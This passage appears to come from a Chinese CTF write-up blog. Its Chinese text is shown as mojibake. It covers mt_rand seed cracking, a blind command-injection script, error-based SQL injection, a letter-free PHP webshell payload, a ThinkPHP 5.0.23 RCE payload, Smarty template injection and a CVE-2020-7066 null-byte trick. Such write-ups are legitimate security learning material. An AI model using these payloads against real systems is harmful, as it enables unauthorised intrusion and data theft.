<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä½¿ç”¨php_mt_randéšæœºæ•°ç§å­çˆ†ç ´ã€‚<br>
ç”¨è„šæœ¬ç”Ÿæˆphp_mt_randå·¥å…·çš„å‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">&#x27; &#x27;</span> + str(j) + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;0&#x27;</span> + <span class="string">&#x27; &#x27;</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
<p>çˆ†ç ´seed<br>
<img src="https://uploader.shimo.im/f/8B6zswJk3nmcP932.png!thumbnail" alt="å›¾ç‰‡"></p>
<p>å†ç”Ÿæˆkeyå€¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mt_srand(<span class="string">&#x27;718225&#x27;</span>);</span><br><span class="line">$lock = random(<span class="number">6</span>, <span class="string">&#x27;abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line">$key = random(<span class="number">16</span>, <span class="string">&#x27;1294567890abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $lock.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> $key;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">$length, $chars = <span class="string">&#x27;0123456789ABC&#x27;</span></span>) </span>&#123;</span><br><span class="line">    $hash = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++) &#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å‘é€payloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;&#x27;&#x27;http://122.112.252.28:20001/&#x27;&#x27;&#x27;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;key&#x27;</span>: <span class="string">&#x27;nRtqGR8mtd9ZOPyI&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;lock&#x27;</span>: <span class="string">&#x27;vEUHaY&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies, headers=headers)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
<h2 id="easyweb">easyweb</h2>
<p>æŠ“åŒ…</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200906210414.png" alt=""></p>
<p>ç„¶åæ— å›æ˜¾å‘½ä»¤æ‰§è¡Œï¼Œç„¶åç›²æ³¨ä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://119.3.37.185/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;if [ `cut -c  &#123;num1&#125; /flag.txt` = &quot;&#123;num2&#125;&quot; ];then sleep 2;fi&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">400</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;cmd&#x27;</span>:payload.format(num1=str(i),num2=chr(j))</span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time()</span><br><span class="line">        requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time()-start_time&gt;<span class="number">2</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> chr(j) == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTFå…«æœˆèµ›WP</title>
    <url>/Web_security/ctf_writeup/23.DASCTF2020%E5%85%AB%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="DASCTFå…«æœˆèµ›-Web-Writeup">DASCTFå…«æœˆèµ› Web Writeup</h1>
<h2 id="å®‰æ’å¤§å­¦">å®‰æ’å¤§å­¦</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>æ¸—é€æµ‹è¯•</li>
<li>SQLæŠ¥é”™æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p>y1ngå¸ˆå‚…å‡ºçš„ä¸€é“é¢˜ï¼Œéå¸¸é¡¶ï¼Œå¯ä»¥è¯´æ˜¯è¿™æ˜¯ä¸€é“å®æˆ˜æ”¹ç¼–é¢˜ï¼Œy1ngå¸ˆå‚…åœ¨åšæ¸—é€æµ‹è¯•æ—¶ï¼Œåœ¨ä¸€ä¸ªç³»ç»Ÿçš„æŸä¸ªä¸èµ·çœ¼çš„åœ°æ–¹â€”â€”é‚®ä»¶æ¿€æ´»é“¾æ¥å‘ç°äº†SQLæ³¨å…¥ï¼Œå¹¶å¾—åˆ°äº†å…¨æ ¡æ‰€æœ‰å­¦ç”Ÿçš„å†…ç½‘å¹³å°è´¦å·å¯†ç ï¼Œè€Œå­¦ç”Ÿçš„æ‰€æœ‰ä¿¡æ¯ã€æ‰€æœ‰ç½‘ä¸ŠåŠäº‹ç­‰ç­‰å‡ ä¹éƒ½ä½¿ç”¨æ ¡å†…ç½‘å¹³å°çš„è´¦å·å¯†ç ã€‚</p>
<p>å…¶å®æ¯”èµ›çš„æ—¶å€™ä¸»åŠæ–¹ä¹Ÿæé†’äº†é‚®ç®±ä¸è¦éšä¾¿å¡«ï¼Œä¸è¿‡å½“æ—¶è¿˜æ˜¯æ²¡èƒ½å¯Ÿè§‰åˆ°é‚®ä»¶æ¿€æ´»é“¾æ¥ä¸­çš„ä¸€ä¸ªå‚æ•°å­˜åœ¨SQLæ³¨å…¥ã€‚</p>
<p>ç°åœ¨æ­£å¼è§£é¢˜ï¼Œç›´æ¥çœ‹é‚®ä»¶æ¿€æ´»é“¾æ¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;ca01h&amp;token&#x3D;cf42313ae7812e9234d5b378f095e688</span><br></pre></td></tr></table></figure>
<p>æ³¨å…¥ç‚¹åœ¨usernameå‚æ•°ï¼Œè¯´ä¸€ä¸‹æˆ‘çš„è§£é¢˜è¿‡ç¨‹ï¼š</p>
<p>é¦–å…ˆä½¿SQLè¯­å¥æŠ¥é”™</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200253.png" alt=""></p>
<p>å†å°è¯•ä¸‡èƒ½æ³¨å…¥payloadï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200602.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/image-20200905200658101.png" alt=""></p>
<p>å¥½åƒå¯ä»¥ä½¿ç”¨ç›²æ³¨ï¼Œå†å°è¯•<code>ca01h2' or if(length(select database())&gt;1, 1, 0)--+</code>ï¼Œç»“æœç›´æ¥SQLè¯­å¥æŠ¥é”™</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200842.png" alt=""></p>
<p>ç›²æ³¨ä¸è¡Œï¼Œè”åˆæ³¨å…¥è¢«è¿‡æ»¤ï¼Œé‚£ä¹ˆæ¥ç€è¯•ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905200951.png" alt=""></p>
<p>æˆåŠŸçˆ†å‡ºå½“å‰ç”¨æˆ·åï¼Œæ¥ä¸‹æ¥çš„å·¥ä½œå°±æ˜¯æ‹¿æ•°æ®ã€‚</p>
<p>çˆ†è¡¨åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure>
<p>ä¸€å…±æœ‰ä¸‰ä¸ªè¡¨ï¼š<code>student, teachers, users</code></p>
<p>çˆ†åˆ—åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;&#39;student&#39; limit 0,1),0x7e)))--+</span><br></pre></td></tr></table></figure>
<p>studentè¡¨ä¸€å…±å››ä¸ªå­—æ®µï¼š<code>id, username, age, sex</code></p>
<p>teachersè¡¨ï¼š<code>id, f1aaaag, </code></p>
<p>çˆ†æ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ca01h2&#39; and (extractvalue(1,concat(0x7e,(select reverse(f1aaaag) from teachers limit 11,1),0x7e)))--+</span><br></pre></td></tr></table></figure>
<h2 id="rceme">rceme</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>æ— å­—æ¯æ•°å­—webshell</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;\~&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>,<span class="string">&#x27;\[&#x27;</span>,<span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\&amp;&#x27;</span>,<span class="string">&#x27;\?&#x27;</span>,<span class="string">&#x27;\&lt;&#x27;</span>,<span class="string">&#x27;\&gt;&#x27;</span>,<span class="string">&#x27;\*&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">&#x27;/&#x27;</span> . $blacklisted . <span class="string">&#x27;/im&#x27;</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;you are not smart&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$code</span>)&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯æ•°å­—å’Œéƒ¨åˆ†é€»è¾‘è¿ç®—ç¬¦ä»¥åŠå¸¸ç”¨äºæ„é€ webshellçš„<code>^</code>ã€<code>~</code>ã€<code>&amp;</code>ç­‰ç¬¦å·ã€‚</p>
<p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé€»è¾‘è¿ç®—ç¬¦æ”¾å‡ºæ¥äº† <code>|</code>æˆ–è¿ç®—ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200905222802.png" alt=""></p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;	&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;&#39;));&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
<p>åº”è¯¥æ˜¯å¯ä»¥ç”¨pythonè„šæœ¬fuzzå‡ºæ¥çš„ã€‚</p>
<p>y1ngå¸ˆå‚…çš„æ–¹æ³•ï¼Œç›´æ¥ä¸ç”¨æˆ–è¿ç®—ç¬¦ï¼ŒTQLLLLLLï¼Œä»£ç çœ‹ä¸å¤ªæ‡‚ï¼Œè†œå°±å®Œäº‹ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: é¢–å¥‡L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">payload, buff</span>):</span></span><br><span class="line">	offset = <span class="number">3</span> + buff</span><br><span class="line">	res = <span class="string">&quot;&quot;</span></span><br><span class="line">	base = <span class="number">65</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(len(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		_ascii = ord(payload[i])</span><br><span class="line">		<span class="comment">#init</span></span><br><span class="line">		underline =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		undefined = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (len(payload) + offset + <span class="number">15</span>))</span><br><span class="line">		var = <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;$__-=<span class="subst">&#123;underline&#125;</span>;$__++;<span class="subst">&#123;underline&#125;</span>/=$__;<span class="subst">&#123;underline&#125;</span>=((<span class="subst">&#123;undefined&#125;</span>/<span class="subst">&#123;undefined&#125;</span>).<span class="subst">&#123;underline&#125;</span>)&quot;</span>+<span class="string">r&quot;&#123;++$__&#125;;$__--;&quot;</span></span><br><span class="line">		res += var;</span><br><span class="line">		tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> _ascii &gt; base:</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(_ascii-base):</span><br><span class="line">				tmp = tmp + <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;&quot;</span></span><br><span class="line">		res += tmp</span><br><span class="line"></span><br><span class="line">	first =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * offset)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;_&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;/&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		final_var = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=<span class="subst">&#123;final_var&#125;</span>;&quot;</span></span><br><span class="line">	<span class="keyword">return</span> [res, <span class="string">&quot;$&quot;</span> + <span class="string">&quot;_&quot;</span> * (offset)]</span><br><span class="line"></span><br><span class="line">pre = <span class="string">&quot;&#x27;&#x27;);&quot;</span></span><br><span class="line">after = <span class="string">&#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWERSHOW_SOURCE&#x27;</span>)</span><br><span class="line">flag = g(<span class="string">&quot;/FLAG&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = len(<span class="string">&#x27;STRTOLOWER&#x27;</span>)</span><br><span class="line">showsource = g(<span class="string">&quot;SHOW_SOURCE&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="number">0</span></span><br><span class="line">strtolower = g(<span class="string">&#x27;STRTOLOWER&#x27;</span>, buff)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.æ„é€ STRTOLOWERå¹¶å­˜è¿›å˜é‡a</span></span><br><span class="line">final += strtolower[<span class="number">0</span>]</span><br><span class="line">a = strtolower[<span class="number">1</span>] <span class="comment"># a = &#x27;$___&#x27; # STRTOLOWER</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.æ„é€ SHOW_SOURCEå¹¶å­˜è¿›å˜é‡b</span></span><br><span class="line">final += showsource[<span class="number">0</span>]</span><br><span class="line">b = showsource[<span class="number">1</span>] <span class="comment"># b = &#x27;$_____________&#x27; #SHOW_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.æ„é€ /FLAGå¹¶å­˜è¿›å˜é‡c</span></span><br><span class="line">final += flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + <span class="string">&quot;=&#x27;/&#x27;.&quot;</span> + flag[<span class="number">1</span>] + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">c = flag[<span class="number">1</span>] <span class="comment"># c = &#x27;$________________________&#x27; #/FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å£°æ˜å¥½abcå˜é‡</span></span><br><span class="line">padding = <span class="string">f&#x27;$______________________________________________=<span class="subst">&#123;a&#125;</span>;$_______________________________________________=<span class="subst">&#123;b&#125;</span>;$________________________________________________=<span class="subst">&#123;c&#125;</span>;&#x27;</span></span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.å˜é‡d = a(c) åˆ™å˜é‡dä¸º/flag</span></span><br><span class="line">d = <span class="string">&quot;$______________________________________________($________________________________________________);&quot;</span></span><br><span class="line">padding = <span class="string">&#x27;$_________________________________________________=&#x27;</span>+d</span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment">#5. b(d) å³ä¸ºSHOW_SOURCE(&#x27;/flag&#x27;)</span></span><br><span class="line">final += <span class="string">&#x27;$_______________________________________________($_________________________________________________);&#x27;</span></span><br><span class="line"></span><br><span class="line">final = pre + final</span><br><span class="line">final = final + after</span><br><span class="line"></span><br><span class="line">print(final.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>))</span><br></pre></td></tr></table></figure>
<h2 id="ezflask">ezflask</h2>
<h3 id="TODO">TODO</h3>
<h2 id="Reference">Reference</h2>
<p><a href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p>
<p><a href="http://phoebe233.cn/?p=248">http://phoebe233.cn/?p=248</a></p>
<p><a href="https://rce.moe/2020/08/25/GeekPwn-2020-%E4%BA%91%E4%B8%8A%E6%8C%91%E6%88%98%E8%B5%9B-cosplay-writeup/">https://rce.moe/2020/08/25/GeekPwn-2020-äº‘ä¸ŠæŒ‘æˆ˜èµ›-cosplay-writeup/</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctfåˆ·é¢˜â€”â€”PHPæ¡†æ¶æ¼æ´ç¯‡</title>
    <url>/Web_security/ctf_writeup/5.buuctf%E5%88%B7%E9%A2%98%E2%80%94%E2%80%94PHP%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E7%AF%87/</url>
    <content><![CDATA[<h1 id="BUUCTFâ€”â€”PHPæ¡†æ¶æ¼æ´ç¯‡">BUUCTFâ€”â€”PHPæ¡†æ¶æ¼æ´ç¯‡</h1>
<h2 id="BJDCTF-2nd-old-hacker">BJDCTF 2nd old-hacker</h2>
<h3 id="è€ƒç‚¹">è€ƒç‚¹</h3>
<ul>
<li>ThinkPHP 5.0.23 RCE</li>
</ul>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?s&#x3D;captcha</span><br><span class="line">POST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
<h2 id="BJDCTF2020-The-mystery-of-ip">BJDCTF2020 The mystery of ip</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>PHP Smarty æ¨¡æ¿æ³¨å…¥</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forward-For: &#123;&#123;system(&quot;ls&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<h2 id="GKCTF2020-CVEç‰ˆç­¾åˆ°">GKCTF2020 CVEç‰ˆç­¾åˆ°</h2>
<h3 id="è€ƒç‚¹-v3">è€ƒç‚¹</h3>
<ul>
<li>cve-2020-7066</li>
</ul>
<h3 id="è§£é¢˜-v3">è§£é¢˜</h3>
<p>é¦–å…ˆGoogleä¸€ä¸‹cve-2020-7066</p>
<blockquote>
<p>åœ¨ä½äº7.2.29çš„PHPç‰ˆæœ¬7.2.xï¼Œä½äº7.3.16çš„7.3.xå’Œä½äº7.4.4çš„7.4.xä¸­ï¼Œ<strong>å°†get_headersï¼ˆï¼‰ä¸ç”¨æˆ·æä¾›çš„URLä¸€èµ·ä½¿ç”¨æ—¶</strong>ï¼Œå¦‚æœURLåŒ…å«é›¶ï¼ˆ\0ï¼‰å­—ç¬¦ï¼Œåˆ™URLå°†è¢«é™é»˜åœ°<strong>æˆªæ–­</strong>ã€‚</p>
</blockquote>
<p>demoï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// user input</span></span><br><span class="line">$_GET[<span class="string">&#x27;url&#x27;</span>] = <span class="string">&quot;http://localhost\0.example.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">$host = parse_url($_GET[<span class="string">&#x27;url&#x27;</span>], PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span> (substr($host, <span class="number">-12</span>) !== <span class="string">&#x27;.example.com&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$headers = get_headers($_GET[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">var_dump($headers);</span><br></pre></td></tr></table></figure>
<p>åœ¨PHP7.1ç‰ˆæœ¬ä¸‹ä¼šè¾“å‡º<code>Null</code>ï¼Œåœ¨PHP7.2ç‰ˆæœ¬ä¸‹ä¼šè¾“å‡º<code>http://localhost</code></p>
<p>è®¿é—®é¦–é¡µæŸ¥çœ‹network</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702153335.png" alt=""></p>
<p>ç»“åˆcve-2020-7066ï¼Œç”¨<code>http://127.0.0.123%00www.ctfhub.com</code>å³å¯è·å¾—flagã€‚</p>
<blockquote>
<p>localhostä¸æ˜¯å•æŒ‡127.0.0.1ï¼Œè€Œæ˜¯ç¬¦åˆ127.0.0.0/24è¿™ä¸€ç½‘æ®µçš„IPåœ°å€ï¼Œæ¯”å¦‚127.0.0.100ä¹Ÿå¯ä»¥å«localhost</p>
</blockquote>
<h2 id="GYCTF2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“">GYCTF2019 æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>phpmyadmin 4.8.1 ä»»æ„æ–‡ä»¶è¯»å–</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<p>æ‰“å¼€é¢˜ç›®æç¤ºæœ‰ä¸€ä¸ªæ•°æ®åº“ï¼Œè®¿é—®robots.txtï¼Œå‘ç°phpinfo.phpé¡µé¢ï¼Œè¿‡ä¸€éä¹‹åæ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ã€‚ï¼ˆæˆ‘éƒ½ä¸çŸ¥é“ä¸ºå•¥è¦ç»™è¿™ä¸ªæ–‡ä»¶ï¼Œåè€ŒæŠŠæˆ‘ç»™å¸¦åäº†ã€‚ï¼‰</p>
<p>æ‰«ä¸€ä¸‹ç›®å½•ï¼Œæ‰«å‡ºæ¥äº†phpmyadminè·¯å¾„ï¼Œè®¿é—®åæ²¡æœ‰å¯†ç ç›´æ¥è¿›å…¥æ•°æ®åº“ç®¡ç†é¡µé¢ï¼Œé™¤äº†MySQLè‡ªå¸¦çš„ä¸¤ä¸ªæ•°æ®åº“ï¼Œç¡®å®æ²¡æœ‰å…¶ä»–çš„æ•°æ®åº“ï¼ŒæŸ¥çœ‹å½“å‰phpmyadminç‰ˆæœ¬æ˜¯4.8.1ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰ä¸€ä¸ªCVE-2018-12613çš„å…¬å¼€æ¼æ´ï¼Œå¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–ã€‚é‚£å°±ç›´æ¥ä¸Špayloadï¼š</p>
